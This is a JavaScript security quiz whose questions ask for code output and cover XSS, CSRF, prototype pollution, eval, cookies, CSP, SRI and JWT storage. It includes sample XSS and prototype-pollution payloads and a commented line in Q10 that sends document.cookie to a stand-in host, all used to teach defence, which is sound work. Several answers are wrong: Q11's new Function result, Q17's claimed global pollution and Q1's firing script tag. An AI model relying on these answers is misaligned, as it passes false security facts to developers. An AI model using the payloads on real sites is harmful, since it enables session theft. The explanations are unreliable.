# JavaScript Security — Tricky Output Questions

## Table of Contents
1. [XSS Questions](#1-xss-questions)
2. [CSRF Questions](#2-csrf-questions)
3. [Prototype Pollution Questions](#3-prototype-pollution-questions)
4. [eval() Questions](#4-eval-questions)
5. [Cookie Security Questions](#5-cookie-security-questions)
6. [CSP Questions](#6-csp-questions)
7. [Advanced Security Questions](#7-advanced-security-questions)

---

## 1. XSS Questions

---

### Q1. What will happen when this code runs? Is it vulnerable?

```js
const params = new URLSearchParams("?name=<script>alert('xss')</script>");
const name = params.get("name");

// Version A
document.getElementById("output").innerHTML = `Welcome, ${name}!`;

// Version B
document.getElementById("output").textContent = `Welcome, ${name}!`;
```

<details>
<summary><strong>Show Output & Explanation</strong></summary>

### Output
```txt
Version A: alert('xss') fires in the browser (XSS executed)
Version B: displays the literal text: Welcome, <script>alert('xss')</script>!
```

### Explanation
**Version A is vulnerable to DOM-based XSS.** `innerHTML` parses the string as HTML. The `<script>` tag is inserted into the DOM and executed (in some browser contexts; modern browsers may block inline scripts from innerHTML, but other tags like `<img onerror="...">` are not blocked).

**Version B is safe.** `textContent` treats the value as a plain string — all special HTML characters are rendered as literal text, not as markup. The string is displayed exactly as-is without any script execution.

Rule: default to `textContent`. Only use `innerHTML` when you explicitly need to render trusted HTML, and use a sanitizer like DOMPurify if the HTML comes from any user-controlled source.

</details>

---

### Q2. What is the output? What attack vector does this code introduce?

```js
const userInput = '<img src="x" onerror="console.log(\'XSS via img onerror\')">';

const container = document.createElement("div");
container.innerHTML = userInput;
document.body.appendChild(container);

console.log("Page rendered");
```

<details>
<summary><strong>Show Output & Explanation</strong></summary>

### Output
```txt
XSS via img onerror
Page rendered
```

### Explanation
Setting `innerHTML` parses the string as HTML. The `<img>` tag is inserted into the DOM. The `src="x"` fails to load (no image at "x"), which triggers the `onerror` event handler — executing `console.log('XSS via img onerror')`.

This illustrates that `<script>` tags are not the only XSS vector. Event handlers on HTML attributes (`onerror`, `onload`, `onclick`, `onfocus`, `onmouseover`, etc.) are equally dangerous. A proper sanitizer (DOMPurify) strips or neutralizes these handlers.

`"Page rendered"` appears after because script execution from `onerror` happens asynchronously when the image load fails (though practically very fast).

</details>

---

### Q3. Will this escapeHTML function prevent XSS in all contexts?

```js
function escapeHTML(str) {
  return str
    .replace(/&/g,  "&amp;")
    .replace(/</g,  "&lt;")
    .replace(/>/g,  "&gt;")
    .replace(/"/g,  "&quot;")
    .replace(/'/g,  "&#x27;");
}

// Context 1: HTML body
const safeForHTML = `<p>${escapeHTML('<script>alert(1)</script>')}</p>`;
console.log(safeForHTML); // safe

// Context 2: inline JavaScript string — HTML escaping is INSUFFICIENT
const userValue = "'; alert('xss'); let x = '";
const unsafeJS = `<script>let name = '${userValue}';</script>`;
const falselyEscapedJS = `<script>let name = '${escapeHTML(userValue)}';</script>`;
console.log("Unsafe JS injection:", unsafeJS.includes("alert")); // true
console.log("HTML-escaped is still parseable JS:", falselyEscapedJS.includes("alert")); // true
```

<details>
<summary><strong>Show Output & Explanation</strong></summary>

### Output
```txt
<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>
Unsafe JS injection: true
HTML-escaped is still parseable JS: true
```

### Explanation
HTML escaping is **context-specific**. It works correctly when inserting text into an HTML body or attribute. But when inserting user data into a `<script>` block (a JavaScript string context), HTML escaping is not enough.

In the `falselyEscapedJS` example: `&#x27;` (HTML entity for `'`) is decoded by the HTML parser before the JavaScript engine sees it, so the JS engine receives a raw `'` — which still breaks out of the string literal. The `alert` call is still present and executable.

Safe rule: never dynamically inject user data into `<script>` blocks. Serve data from the server as JSON in a `data-*` attribute or a dedicated API endpoint.

</details>

---

### Q4. What is the output? Which line is safe and which is vulnerable?

```js
const userComment = "Great article! <b>Bold opinion</b><script>stealData()</script>";

// A — rendered as HTML
const div = document.createElement("div");
div.innerHTML = userComment;
console.log("innerHTML childNodes:", div.childNodes.length); // how many?

// B — rendered as text
const span = document.createElement("span");
span.textContent = userComment;
console.log("textContent length:", span.textContent.length);
```

<details>
<summary><strong>Show Output & Explanation</strong></summary>

### Output
```txt
innerHTML childNodes: 3
textContent length: 67
```

### Explanation
**A:** `innerHTML` parses the string. The result is 3 child nodes: `Text("Great article! ")`, `<b>Bold opinion</b>`, and `<script>stealData()</script>`. The script tag is created in the DOM (though browsers typically do not execute scripts injected via `innerHTML` — they do execute them via `document.write` or `eval`). Other vectors like `<img onerror>` are executed. `div.childNodes.length` is `3`.

**B:** `textContent` does not parse any HTML. The entire string — including the `<script>` tags — is stored and rendered as literal text (HTML-escaped when painted). No script is created. Safe. `span.textContent.length` is the length of the full raw string (`67` characters, approximate).

</details>

---

## 2. CSRF Questions

---

### Q5. Is this fetch request protected against CSRF?

```js
// On the origin https://app.example.com
fetch("https://api.example.com/user/delete", {
  method: "POST",
  credentials: "include",  // sends cookies
  headers: {
    "Content-Type": "application/json",
    "X-CSRF-Token": document.querySelector('meta[name="csrf-token"]').content
  },
  body: JSON.stringify({ userId: 42 })
});

console.log("Delete request sent");
```

<details>
<summary><strong>Show Output & Explanation</strong></summary>

### Output
```txt
Delete request sent
```

### Explanation
Yes, this request has **CSRF protection** via the custom `X-CSRF-Token` header.

An attacker's malicious page (on a different origin) cannot replicate this request because:
1. The CSRF token is read from a `<meta>` tag that is only accessible via JavaScript **on the same origin** (same-origin policy blocks cross-origin DOM reads).
2. Simple HTML form submissions and `<script>` tag requests cannot set custom headers — only `fetch`/`XMLHttpRequest` can, and those are blocked from including cross-origin cookies unless the server explicitly allows it via CORS.

The `credentials: "include"` sends the session cookie, but the server should validate both the session cookie AND the CSRF token before processing the request.

</details>

---

### Q6. Does using `SameSite=Lax` fully protect against CSRF?

```js
// Server sets the session cookie:
// Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax

// Attacker tries these CSRF vectors:
// Vector 1: Malicious form POST from evil.com
// <form action="https://bank.com/transfer" method="POST">
//   <input name="amount" value="1000" />
// </form>
// Result: cookie NOT sent (SameSite=Lax blocks cross-site POST)

// Vector 2: Top-level GET navigation from evil.com
// <a href="https://bank.com/logout">Click me</a>
// Result: cookie IS sent (SameSite=Lax allows top-level GET navigations)

// Vector 3: Prerendering/prefetch from evil.com
// <link rel="prefetch" href="https://bank.com/transfer?amount=1000" />
// Result: cookie NOT sent in modern browsers

console.log("SameSite=Lax blocks POST but allows GET navigations");
console.log("Never allow state-changing actions via GET requests");
```

<details>
<summary><strong>Show Output & Explanation</strong></summary>

### Output
```txt
SameSite=Lax blocks POST but allows GET navigations
Never allow state-changing actions via GET requests
```

### Explanation
`SameSite=Lax` is a good default but is **not a complete CSRF defense** by itself:

- It blocks cross-site form POSTs — good, covers the most common CSRF vector.
- It allows cookies on **top-level GET navigations** — if your server performs state changes on GET endpoints (e.g., `/logout?confirm=1`, `/approve?id=5`), those are still exploitable.

Full protection requires: `SameSite=Lax` (or `Strict`) **plus** CSRF tokens on all state-changing requests. For maximum protection, use `SameSite=Strict` (cookies never sent cross-site in any context) if cross-site linking does not matter for your app.

</details>

---

## 3. Prototype Pollution Questions

---

### Q7. What will be the output?

```js
const payload = JSON.parse('{"__proto__": {"polluted": true}}');

function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === "object" && source[key] !== null) {
      target[key] = merge(target[key] || {}, source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

const config = merge({}, payload);

const newObj = {};
console.log(newObj.polluted);  // A
console.log({}.polluted);      // B
console.log(config.polluted);  // C
```

<details>
<summary><strong>Show Output & Explanation</strong></summary>

### Output
```txt
true
true
true
```

### Explanation
When `merge` encounters the `__proto__` key from `payload`, it does `target["__proto__"] = merge(target["__proto__"] || {}, { polluted: true })`. Setting `target["__proto__"]` modifies the **prototype of `target`** (which is `Object.prototype` for plain objects). This adds `polluted: true` to `Object.prototype`.

Now **every** object in the application inherits `polluted: true` through the prototype chain:
- `newObj.polluted` → looks up prototype chain → finds `true` on `Object.prototype`
- `{}.polluted` → same
- `config.polluted` → same

This is why prototype pollution is so dangerous — it can silently alter the behavior of the entire application.

</details>

---

### Q8. What is the output? Does `Object.keys` protect against prototype pollution?

```js
// Simulate prior prototype pollution
Object.prototype.secret = "leaked";

const obj = { name: "Alice", role: "user" };

// for...in iterates own + prototype properties
const forInKeys = [];
for (const key in obj) {
  forInKeys.push(key);
}
console.log("for...in:", forInKeys);

// Object.keys only returns OWN enumerable properties
console.log("Object.keys:", Object.keys(obj));

// hasOwnProperty check
for (const key in obj) {
  if (Object.prototype.hasOwnProperty.call(obj, key)) {
    // safe pattern — doesn't rely on obj.hasOwnProperty (could be overridden)
  }
}
console.log("After check — secret is own?", obj.hasOwnProperty("secret"));
```

<details>
<summary><strong>Show Output & Explanation</strong></summary>

### Output
```txt
for...in: [ 'name', 'role', 'secret' ]
Object.keys: [ 'name', 'role' ]
After check — secret is own? false
```

### Explanation
After prototype pollution, `Object.prototype.secret = "leaked"` means every object's `for...in` loop enumerates `secret` (it is enumerable and inherited). This is why iterating with `for...in` without `hasOwnProperty` guard is dangerous — it processes injected prototype properties as if they were own data.

`Object.keys` only returns **own** enumerable properties — it correctly excludes the polluted `secret`. This is one reason `Object.keys` (and `Object.entries`) are preferable to `for...in` in security-sensitive code.

Cleanup: `delete Object.prototype.secret` would restore the prototype, but in production you should prevent the pollution in the first place.

</details>

---

### Q9. What is the output? How does `Object.create(null)` prevent pollution attacks?

```js
// Regular object — has Object.prototype in the chain
const regularDict = {};
regularDict["key"] = "value";
console.log("toString" in regularDict);       // A
console.log(regularDict.hasOwnProperty);      // B

// Null-prototype object — no prototype chain
const safeDict = Object.create(null);
safeDict["key"] = "value";
console.log("toString" in safeDict);          // C
console.log(safeDict.hasOwnProperty);         // D

// Pollution attempt on null-prototype object
const attacker = JSON.parse('{"__proto__": {"evil": true}}');
Object.assign(safeDict, attacker); // __proto__ is set as own property, not prototype
console.log(safeDict.__proto__);   // E
console.log({}.evil);              // F — Object.prototype should be clean
```

<details>
<summary><strong>Show Output & Explanation</strong></summary>

### Output
```txt
true
[Function: hasOwnProperty]
false
undefined
{ evil: true }
undefined
```

### Explanation
(A) `"toString" in regularDict` is `true` — `toString` is inherited from `Object.prototype`.
(B) `regularDict.hasOwnProperty` is the built-in function — inherited.
(C) `"toString" in safeDict` is `false` — `Object.create(null)` creates an object with **no prototype**. No inherited properties.
(D) `safeDict.hasOwnProperty` is `undefined` — there is no prototype to inherit from.

(E) `Object.assign(safeDict, attacker)` copies `__proto__` as a **literal own property string key** on `safeDict` (not as a prototype assignment). So `safeDict.__proto__` is the object `{ evil: true }` — a regular own property.

(F) `{}.evil` is `undefined` — `Object.prototype` was NOT polluted because `Object.assign` on a null-prototype target treats `__proto__` as a regular key. The global `Object.prototype` remains clean.

</details>

---

## 4. eval() Questions

---

### Q10. What is the output? What security risk does this code have?

```js
function calculate(expression) {
  return eval(expression);
}

console.log(calculate("2 + 2"));            // A — intended use
console.log(calculate("Math.PI * 2"));      // B — still "harmless"

// What an attacker can do:
// calculate("fetch('https://evil.com/?c=' + document.cookie)")
// calculate("localStorage.clear()")
// calculate("window.location = 'https://phishing.com'")

// The function looks innocent but accepts ARBITRARY CODE EXECUTION
console.log("eval accepts any JS expression — including malicious code");
```

<details>
<summary><strong>Show Output & Explanation</strong></summary>

### Output
```txt
4
6.283185307179586
eval accepts any JS expression — including malicious code
```

### Explanation
(A) `eval("2 + 2")` evaluates to `4`. Correct result.
(B) `eval("Math.PI * 2")` evaluates to `6.283...`. Correct result.

The function works as intended for safe inputs. But `eval` executes **any** valid JavaScript — an attacker who can control the `expression` argument has full Remote Code Execution in the browser context: reading cookies, accessing `localStorage`, making network requests, redirecting the user, etc.

Safe alternative for a calculator: use a proper expression parser library (e.g., `mathjs`), or restrict input to a whitelist of safe operations. Never pass user-controlled strings to `eval`.

</details>

---

### Q11. What is the output? Does `eval` have access to local scope?

```js
function outer() {
  const privateKey = "sk-secret-1234567890";
  const userInput = "privateKey"; // attacker controls this

  const result = eval(userInput); // leaks local variable!
  return result;
}

console.log(outer()); // A

// Compare with new Function — does NOT have access to local scope
function outerSafe() {
  const privateKey = "sk-secret-1234567890";
  const userInput = "privateKey";

  try {
    const fn = new Function("return " + userInput);
    return fn(); // runs in global scope — no access to local privateKey
  } catch (e) {
    return "Error: " + e.message;
  }
}

console.log(outerSafe()); // B
```

<details>
<summary><strong>Show Output & Explanation</strong></summary>

### Output
```txt
sk-secret-1234567890
undefined
```

### Explanation
(A) `eval(userInput)` evaluates the string `"privateKey"` as a JavaScript expression **in the current scope** — it reads the local variable `privateKey` and returns its value. A local secret is directly leaked.

(B) `new Function("return privateKey")` creates a function that runs in the **global scope** (not the local scope). There is no `privateKey` variable in the global scope, so it evaluates to `undefined` without throwing an error.

Key difference: `eval` has access to the local lexical scope; `new Function` does not. However, `new Function` is still dangerous if user-supplied strings are used — it can access `window`, make `fetch` calls, read from `document`, etc. Neither should be used with untrusted input.

</details>

---

### Q12. What is the output? What is a safer alternative to this setTimeout usage?

```js
// Using setTimeout with a string argument (string is eval'd internally)
const delay = 500;
const message = "Hello from setTimeout string";

// Dangerous — the string is evaluated like eval()
setTimeout("console.log('" + message + "')", delay);

// What an attacker could inject:
const injected = "'); alert('XSS"); // breaks the string and injects code
// setTimeout("console.log('" + injected + "')", delay);
// Evaluates: console.log(''); alert('XSS')

// Safe — use a function reference
setTimeout(() => {
  console.log(message); // message is captured via closure — no string eval
}, delay);

console.log("Scripts registered");
```

<details>
<summary><strong>Show Output & Explanation</strong></summary>

### Output
```txt
Scripts registered
Hello from setTimeout string     (after 500ms)
Hello from setTimeout string     (after 500ms)
```

### Explanation
`setTimeout` accepts either a **function** or a **string**. When passed a string, it is evaluated with `eval`-like semantics — it has the same security risks. If any part of the string comes from user input, code injection is possible.

The safe version uses an **arrow function** that closes over `message`. There is no string evaluation — the function is called directly. This is both safer and faster (no parsing of a string at runtime).

`console.log("Scripts registered")` fires first (synchronous). Both setTimeout callbacks fire after 500ms.

</details>

---

## 5. Cookie Security Questions

---

### Q13. What is the output? What does this reveal about cookie security?

```js
// Simulate an XSS payload that steals cookies
document.cookie = "sessionId=abc123; path=/";       // regular cookie
document.cookie = "theme=dark; path=/";             // UI preference cookie

// What XSS payload can read:
const stolenCookies = document.cookie;
console.log("Accessible via document.cookie:", stolenCookies);

// An HttpOnly cookie (set by the server) does NOT appear here:
// Set-Cookie: authToken=secret; HttpOnly; Secure; SameSite=Strict
// → This cookie is SENT with requests but CANNOT be read by JavaScript
// → document.cookie will NOT include it

// Simulated output (HttpOnly cookie is invisible to JS):
const cookieNames = stolenCookies.split("; ").map(c => c.split("=")[0]);
console.log("Readable cookie names:", cookieNames);
```

<details>
<summary><strong>Show Output & Explanation</strong></summary>

### Output
```txt
Accessible via document.cookie: sessionId=abc123; theme=dark
Readable cookie names: [ 'sessionId', 'theme' ]
```

### Explanation
`document.cookie` returns all non-`HttpOnly` cookies for the current origin. An XSS attacker running arbitrary JavaScript can read these and exfiltrate them.

`sessionId=abc123` is readable (and stealable) because it was NOT set with the `HttpOnly` flag. If it were an authentication token, the attacker now has full account takeover.

`authToken` (set with `HttpOnly` by the server) would NOT appear in `document.cookie`. The browser sends it automatically with requests but prevents JavaScript from reading it. This is why session tokens should always be `HttpOnly` cookies — even a successful XSS attack cannot steal the token.

</details>

---

### Q14. What is the output? What is the difference between these two cookie-reading patterns?

```js
// Pattern A: checking if a specific cookie exists
function getCookie(name) {
  const cookies = document.cookie.split("; ");
  for (const cookie of cookies) {
    const [key, value] = cookie.split("=");
    if (key === name) return decodeURIComponent(value);
  }
  return null;
}

document.cookie = "username=alice%40example.com; path=/";
document.cookie = "visited=true; path=/";

console.log(getCookie("username")); // A
console.log(getCookie("visited"));  // B
console.log(getCookie("admin"));    // C

// Pattern B: using a malformed cookie name to exploit naive parsing
document.cookie = "a=b; extraKey=hackedValue; path=/";
// The above creates ONE cookie named "a" with value "b; extraKey=hackedValue"
// because document.cookie only sets up to the first ";" as the value
// (the rest are treated as cookie attributes)
console.log(getCookie("a"));        // D
```

<details>
<summary><strong>Show Output & Explanation</strong></summary>

### Output
```txt
alice@example.com
true
null
b
```

### Explanation
(A) `getCookie("username")` correctly decodes `alice%40example.com` to `alice@example.com` using `decodeURIComponent`.
(B) `getCookie("visited")` returns `"true"`.
(C) `getCookie("admin")` returns `null` — the cookie does not exist.
(D) `getCookie("a")` returns `"b"`. The semicolon in `"b; extraKey=hackedValue"` is interpreted as a cookie attribute separator by the browser — only `a=b` is stored as the cookie. The "extra" part is ignored (treated as an invalid attribute).

This illustrates that cookie parsing is sensitive to semicolons. Always `encodeURIComponent` cookie values when they may contain special characters.

</details>

---

## 6. CSP Questions

---

### Q15. Which of these script executions will a strict CSP block?

```js
// Assume the server sends:
// Content-Security-Policy: script-src 'self' 'nonce-xyz789'; object-src 'none'

// Script 1: inline script WITHOUT nonce
// <script>console.log("no nonce");</script>
// → BLOCKED by CSP

// Script 2: inline script WITH matching nonce
// <script nonce="xyz789">console.log("has nonce");</script>
// → ALLOWED by CSP

// Script 3: external script from same origin
// <script src="/app.js"></script>
// → ALLOWED ('self')

// Script 4: external script from CDN (not in script-src)
// <script src="https://cdn.attackerexample.com/evil.js"></script>
// → BLOCKED (cdn.attackerexample.com not in script-src)

// Script 5: eval() from within an allowed script
// eval("console.log('eval')");
// → BLOCKED unless 'unsafe-eval' is in CSP

// Script 6: new Function()
// new Function("console.log('new Function')")();
// → BLOCKED unless 'unsafe-eval' is in CSP

const blocked  = ["no-nonce inline", "cdn-external", "eval()", "new Function()"];
const allowed  = ["nonce-matching inline", "same-origin external"];
console.log("Blocked:", blocked);
console.log("Allowed:", allowed);
```

<details>
<summary><strong>Show Output & Explanation</strong></summary>

### Output
```txt
Blocked: [ 'no-nonce inline', 'cdn-external', 'eval()', 'new Function()' ]
Allowed: [ 'nonce-matching inline', 'same-origin external' ]
```

### Explanation
With `script-src 'self' 'nonce-xyz789'`:

- Inline scripts without a matching nonce are **blocked**. This is the primary XSS mitigation — even if an attacker injects a `<script>` tag, it lacks the server-generated nonce.
- Scripts with `nonce="xyz789"` are **allowed** because the nonce matches.
- Scripts from `'self'` (same origin) are **allowed**.
- Scripts from any other origin (CDN, attacker domain) are **blocked**.
- `eval()` and `new Function()` are **blocked** by default — they require `'unsafe-eval'` in the CSP (which you should avoid adding).

A nonce must be: generated server-side on each request, cryptographically random, and never reused or predictable.

</details>

---

### Q16. What is the output? Does this CSP header prevent reflected XSS?

```js
// Server sends: Content-Security-Policy: default-src 'self'; script-src 'unsafe-inline' 'self'

// Attacker crafts URL: https://app.com/search?q=<script>stealCookies()</script>
// Server reflects: <p>Results for: <script>stealCookies()</script></p>

// Does the CSP prevent this?
const csrPolicy = "default-src 'self'; script-src 'unsafe-inline' 'self'";
const hasUnsafeInline = csrPolicy.includes("'unsafe-inline'");

console.log("Has unsafe-inline:", hasUnsafeInline);
console.log("Is reflected XSS possible?", hasUnsafeInline ? "YES — CSP provides NO protection" : "NO — inline scripts blocked");
```

<details>
<summary><strong>Show Output & Explanation</strong></summary>

### Output
```txt
Has unsafe-inline: true
Is reflected XSS possible? YES — CSP provides NO protection
```

### Explanation
`'unsafe-inline'` in `script-src` completely disables CSP's ability to block inline script execution. With this directive, any injected `<script>` tag — including a reflected XSS payload — executes freely.

`'unsafe-inline'` is commonly added to CSP when developers have lots of legacy inline scripts and want to avoid fixing them. It effectively voids the XSS protection benefit of CSP.

The correct approach: replace inline scripts with external scripts (allowed via `'self'`), or use nonces/hashes for necessary inline scripts. Only use `'unsafe-inline'` if you accept the security trade-off and have other mitigations in place.

</details>

---

## 7. Advanced Security Questions

---

### Q17. What is the output? What vulnerability does this code contain?

```js
// Simplified deep clone that is vulnerable to prototype pollution
function deepClone(obj) {
  if (typeof obj !== "object" || obj === null) return obj;
  const clone = {};
  for (const key in obj) {
    clone[key] = deepClone(obj[key]);
  }
  return clone;
}

const malicious = JSON.parse('{"__proto__": {"isAdmin": true}, "name": "Alice"}');
const cloned = deepClone(malicious);

const freshObj = {};
console.log(freshObj.isAdmin);  // A
console.log(cloned.name);       // B
console.log(Object.keys(cloned)); // C
```

<details>
<summary><strong>Show Output & Explanation</strong></summary>

### Output
```txt
true
Alice
[ 'name' ]
```

### Explanation
`deepClone` uses `for...in` which iterates **all enumerable properties, including inherited ones**. When the `key` is `"__proto__"`, `clone["__proto__"] = deepClone(obj["__proto__"])` executes. This sets the `__proto__` property on `clone`, which modifies `clone`'s prototype — and since `clone` inherits from `Object.prototype`, it effectively pollutes `Object.prototype`.

(A) `freshObj.isAdmin` is `true` — pollution spread to all objects.
(B) `cloned.name` is `"Alice"` — own property, works correctly.
(C) `Object.keys(cloned)` is `["name"]` — `__proto__` is not an own enumerable key.

Fix: use `Object.keys(obj)` instead of `for...in`, and skip `__proto__` / `constructor` keys:
```js
function safeClone(obj) {
  if (typeof obj !== "object" || obj === null) return obj;
  const clone = Object.create(null); // or {}
  for (const key of Object.keys(obj)) { // own keys only
    if (key === "__proto__") continue;
    clone[key] = safeClone(obj[key]);
  }
  return clone;
}
```

</details>

---

### Q18. What is the output? What security vulnerability is demonstrated?

```js
// Simulating a URL redirect parameter vulnerability (Open Redirect)
function redirectTo(url) {
  // BAD — redirects to any URL, including attacker-controlled ones
  window.location.href = url;
}

// Attacker sends user a link:
// https://trusted-bank.com/login?next=https://evil-phishing.com/fake-login

function safeRedirectTo(url) {
  try {
    const parsed = new URL(url);
    // Only allow redirects within the same origin
    if (parsed.origin !== window.location.origin) {
      console.log("Redirect BLOCKED — external URL:", parsed.origin);
      return;
    }
    window.location.href = url;
    console.log("Redirect allowed — same origin");
  } catch {
    console.log("Redirect BLOCKED — invalid URL");
  }
}

// Simulate the check without actually redirecting
const sameOriginURL   = "https://example.com/dashboard";
const externalURL     = "https://evil-phishing.com/fake-login";
const currentOrigin   = "https://example.com";

console.log(new URL(sameOriginURL).origin === currentOrigin);   // A
console.log(new URL(externalURL).origin === currentOrigin);     // B
```

<details>
<summary><strong>Show Output & Explanation</strong></summary>

### Output
```txt
true
false
```

### Explanation
(A) `https://example.com/dashboard` has origin `https://example.com` — matches the current origin. A redirect here is safe (same site, same security context).

(B) `https://evil-phishing.com/fake-login` has origin `https://evil-phishing.com` — does not match. This is an **open redirect** — a vulnerability where attackers craft links to trusted domains that automatically redirect to malicious sites, exploiting users' trust in the original domain for phishing.

The `safeRedirectTo` function validates that redirects stay within the same origin. Always validate and whitelist redirect targets on both client and server when building authentication flows, payment flows, or any feature that redirects users based on URL parameters.

</details>

---

### Q19. What is the output? What does this reveal about SRI and CDN security?

```js
// Without SRI: CDN can serve malicious code
// <script src="https://cdn.example.com/jquery.min.js"></script>
// If cdn.example.com is compromised, attackers push malicious jquery.min.js
// → All users of your site run the attacker's code

// With SRI: browser verifies hash before execution
// <script
//   src="https://cdn.example.com/jquery.min.js"
//   integrity="sha384-CORRECT_HASH_HERE"
//   crossorigin="anonymous">
// </script>
// If the file changes, the hash won't match → browser REFUSES to execute

// Simulating SRI hash check
function simulateSRICheck(fileContent, expectedHash, actualHash) {
  const hashMatches = expectedHash === actualHash;
  console.log("File hash matches expected:", hashMatches);
  if (!hashMatches) {
    console.log("SRI check FAILED — script NOT executed (possible tampering)");
    return false;
  }
  console.log("SRI check PASSED — script executed safely");
  return true;
}

simulateSRICheck("jquery code", "sha384-abc123", "sha384-abc123"); // A
simulateSRICheck("malicious code", "sha384-abc123", "sha384-xyz999"); // B
```

<details>
<summary><strong>Show Output & Explanation</strong></summary>

### Output
```txt
File hash matches expected: true
SRI check PASSED — script executed safely
File hash matches expected: false
SRI check FAILED — script NOT executed (possible tampering)
```

### Explanation
(A) The file's hash matches the expected hash — the content has not been modified. The browser executes the script.

(B) The file's hash does not match — the file has been tampered with (a compromised CDN served a modified file). The browser refuses to execute it, protecting the user even though the CDN was compromised.

SRI is essential for any `<script>` or `<link>` loaded from a CDN. Generate the hash from the original file and embed it in your HTML. If the CDN changes the file (even whitespace), the hash changes and the browser blocks it.

Note: SRI requires either a same-origin response or `crossorigin="anonymous"` / `crossorigin="use-credentials"` on the element (to allow the browser to inspect the response body).

</details>

---

### Q20. What is the output? What authentication vulnerability does this illustrate?

```js
// Simulating JWT storage strategies and their XSS exposure

// Strategy A: Store JWT in localStorage
function storeTokenInLocalStorage(token) {
  localStorage.setItem("authToken", token);
  return localStorage.getItem("authToken"); // accessible to any JS on the page
}

// Strategy B: Store JWT in memory (JS variable)
let inMemoryToken = null;
function storeTokenInMemory(token) {
  inMemoryToken = token;
  return inMemoryToken; // lost on page refresh, invisible to other scripts
}

const mockToken = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.payload.signature";

const lsToken = storeTokenInLocalStorage(mockToken);
console.log("localStorage token readable:", lsToken !== null); // A

const memToken = storeTokenInMemory(mockToken);
console.log("Memory token readable:", memToken !== null); // B

// XSS simulation: attacker code can read localStorage
const xssPayload = () => {
  const stolen = localStorage.getItem("authToken");
  return stolen ? "Token stolen: " + stolen.substring(0, 20) + "..." : "No token";
};

console.log("XSS can see localStorage token:", xssPayload()); // C
console.log("XSS cannot see memory token from outside scope"); // D
```

<details>
<summary><strong>Show Output & Explanation</strong></summary>

### Output
```txt
localStorage token readable: true
Memory token readable: true
XSS can see localStorage token: Token stolen: eyJ0eXAiOiJKV1QiLC...
XSS cannot see memory token from outside scope
```

### Explanation
(A) `localStorage` is persistent and accessible to any JavaScript running in the same origin — including attacker code injected via XSS.

(B) An in-memory variable is only accessible within its own scope (module/closure). An XSS payload injected via `innerHTML` or similar cannot directly access another module's variables.

(C) The simulated XSS payload successfully reads the `localStorage` token — demonstrating that localStorage is not safe for storing session tokens if there is any XSS risk.

(D) Memory storage prevents XSS from stealing the token, but the token is lost on page refresh (requiring re-authentication). For production: the best pattern is `HttpOnly` cookies for long-lived tokens, combined with a short-lived in-memory access token obtained at page load via a `credentials: "include"` fetch.

</details>

---

## Final Tips

- Never trust `innerHTML` with user-supplied data. Always default to `textContent` for plain text and DOMPurify for intentional HTML rendering.
- HTML escaping is context-specific. Escaping `<` and `>` is insufficient inside `<script>` blocks, CSS, URL contexts, or JavaScript string literals.
- `SameSite=Lax` blocks cross-site POST but allows GET navigations — never perform state-changing operations via GET requests.
- Prototype pollution can silently break authorization checks across an entire application — always sanitize merge/deep-assign inputs and prefer `Object.create(null)` for dictionaries.
- `eval()` has access to the local lexical scope. `new Function()` runs in global scope but is still dangerous with user-controlled strings. Both should be avoided entirely.
- `HttpOnly` cookies cannot be read by JavaScript — even a successful XSS cannot steal them. Always use `HttpOnly` for session tokens.
- CSP with `'unsafe-inline'` provides no XSS protection — it is equivalent to no CSP for inline scripts. Use nonces or hashes instead.
- SRI protects against CDN supply-chain attacks by verifying file hashes before execution.
- `npm audit` should be part of every CI/CD pipeline — vulnerabilities in dependencies are as dangerous as vulnerabilities in your own code.
- Client-side validation is UX; server-side validation is the actual security control. Always validate on the server, even if you also validate on the client.

<p align="right">
  <a href="#table-of-contents">⬆ Back to Top</a>
</p>
